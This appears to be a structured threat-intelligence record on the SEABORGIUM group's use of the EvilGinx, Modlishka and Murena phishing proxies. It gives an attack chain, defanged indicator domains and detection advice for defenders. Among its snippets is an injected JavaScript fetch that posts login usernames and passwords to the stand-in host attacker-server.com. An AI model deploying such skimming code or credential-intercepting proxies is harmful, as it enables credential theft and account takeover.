package_info.package_name: EvilGinx (and related phishing frameworks: Modlishka, Murena)
package_info.package_manager: open-source (GitHub repositories, not a traditional package manager)
package_info.package_versions: Multiple versions; specific versions not detailed in report
package_info.why_malicious: These open-source phishing frameworks are used by SEABORGIUM to create highly convincing credential harvesting sites that proxy authentication flows, intercepting credentials and session cookies. Their deployment in targeted phishing campaigns, combined with infrastructure designed to evade detection and exfiltrate sensitive data, makes the entire package malicious in this context.

execution_context.file_location: phishing framework server-side code (e.g., EvilGinx main proxy module)

malicious_snippets.code_language: nginx config / golang / python (varies by framework)
malicious_snippets.code_behavior: At runtime, the code proxies authentication requests to legitimate login portals, intercepts credentials and session cookies from HTTP POST data, and exfiltrates them to attacker infrastructure, enabling account takeover.

malice_analysis.why_suspicious: Intercepting authentication credentials and session cookies is a hallmark of credential phishing and session hijacking attacks.
malice_analysis.violated_expectations: Normal reverse proxies do not extract or exfiltrate sensitive authentication data; legitimate use would not involve credential harvesting.
malice_analysis.similar_legitimate_use: Reverse proxies are used for load balancing or security in legitimate infrastructure, but never for credential interception.
key_indicators: Proxying authentication flows to legitimate services
Exfiltration of sensitive data to attacker-controlled endpoints

execution_context.file_location: phishing framework plugin/module for credential capture

malicious_snippets.code_snippet:
def on_login_post(request):
    creds = extract_credentials(request)
    session = extract_session_cookies(request)
    save_to_file(creds, session)
    send_to_attacker(creds, session)
malicious_snippets.code_behavior: At runtime, the code hooks into the login POST handler, extracts submitted credentials and session cookies, saves them locally, and sends them to an attacker-controlled server.

malice_analysis.why_suspicious: Capturing and exfiltrating credentials is inherently malicious and not part of any legitimate authentication process.
malice_analysis.violated_expectations: Legitimate authentication handlers process credentials for verification, not for exfiltration.
malice_analysis.similar_legitimate_use: None; credential exfiltration is always malicious.

execution_context.file_location: JavaScript injected into phishing login page

malicious_snippets.code_snippet:
<script>
fetch('https://attacker-server.com/log', {
  method: 'POST',
  body: JSON.stringify({
    username: document.getElementById('username').value,
    password: document.getElementById('password').value
  })
});
</script>
malicious_snippets.code_behavior: At runtime, the code captures user credentials entered into the phishing login form and sends them via HTTP POST to an attacker-controlled server.

malice_analysis.why_suspicious: Injecting JavaScript to exfiltrate credentials from a login form is a classic phishing technique.
malice_analysis.violated_expectations: Legitimate login pages do not send credentials to third-party domains.
malice_analysis.similar_legitimate_use: Form data may be sent to legitimate authentication APIs, but never to unrelated external domains.
key_indicators: Use of fetch/XHR to unknown domains

attack_chain.action: Threat actor sends phishing email with malicious link or attachment to target.
attack_chain.leads_to: Victim clicks link and visits attacker-controlled phishing site.

attack_chain.action: Victim visits phishing site, which proxies legitimate login page using EvilGinx/Modlishka/Murena.
attack_chain.leads_to: Victim enters credentials into phishing page.

attack_chain.action: Phishing framework intercepts credentials and session cookies during authentication flow.
attack_chain.leads_to: Credentials and session data are exfiltrated to attacker.

attack_chain.action: Attacker uses harvested credentials/session cookies to access victim's email and set up forwarding rules for ongoing access.
attack_chain.leads_to: Persistent access and further impersonation or data theft.

behavioral_signatures: Proxying authentication flows to legitimate services with credential/session interception
JavaScript or server-side code exfiltrating credentials to non-corporate domains
Phishing sites closely mimicking legitimate login portals but hosted on suspicious domains
file_indicators: Presence of EvilGinx/Modlishka/Murena framework files on web servers
Custom plugins or modules for credential/session capture
Injected JavaScript in login pages sending data to external domains
network_indicators: Outbound HTTP/HTTPS requests to domains such as cache-dns[.]com, cache-pdf[.]com, docs-cache[.]com, etc.
Phishing infrastructure using lookalike domains (e.g., officeonline365[.]live, cloud-docs[.]com)
Unusual POST requests from login pages to non-corporate endpoints
detection_knowledge.how_to_detect: Monitor for web servers hosting EvilGinx, Modlishka, or Murena frameworks, especially those proxying authentication flows to major cloud providers. Detect JavaScript or server-side code that exfiltrates credentials to external domains. Flag network traffic to known phishing domains (see IOCs) and lookalike login portals. Use email security solutions to block or quarantine messages containing links to these domains. Monitor for anomalous authentication activity, especially new email forwarding rules or logins from unexpected locations.
